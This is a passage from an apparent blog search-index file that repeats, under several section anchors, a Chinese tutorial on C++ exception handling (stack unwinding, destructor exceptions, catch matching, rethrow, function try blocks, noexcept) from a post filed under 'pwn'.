内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#高级异常机制"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#对象销毁"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#析构函数与异常"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#throw"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#catch"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","tags":null,"title":"C++pwn之异常处理","uri":"/posts/cpp_pwn/#try"},{"categories":["pwn"],"collections":null,"content":"高级异常机制\r当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁\r当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常\r栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw\r异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catch\rcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try\r普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept\r了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 